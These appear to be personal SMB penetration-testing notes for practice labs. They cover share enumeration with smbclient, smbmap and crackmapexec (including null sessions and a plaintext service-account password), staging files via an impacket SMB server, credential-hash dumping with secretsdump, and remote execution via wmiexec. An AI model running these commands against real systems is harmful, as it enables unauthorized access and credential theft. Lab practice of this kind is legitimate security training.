# SAMBA

## How do I recursively download a directory using smbclient?

```
smbclient \\\\10.11.1.231\\home
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *

```
smbclient -L 192.168.175.10 --port=4455 --user=administrator

smbclient -L 10.11.1.31

### SMBMAP

`smbmap -u '' -p ''  -H 10.11.1.231 -R  'home'`

```
smbmap -H 10.10.10.100    # null session
smbmap -H 10.10.10.100 -R # recursive listing
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18

```

smbget -R smb://fileserver/directory

crackmapexec smb 10.11.1.5

To copy file from kali start a smb server on kali

impacket-smbserver mogli .


The on windows net use 

net use * \\ip of kali\mogli


# Didn't work for me
impacket-secretsdump backdoor1:evil123#@10.11.1.31 -outputfile hashes
python /usr/share/doc/python3-impacket/examples/wmiexec.py test:'evil123!'@10.11.1.31 

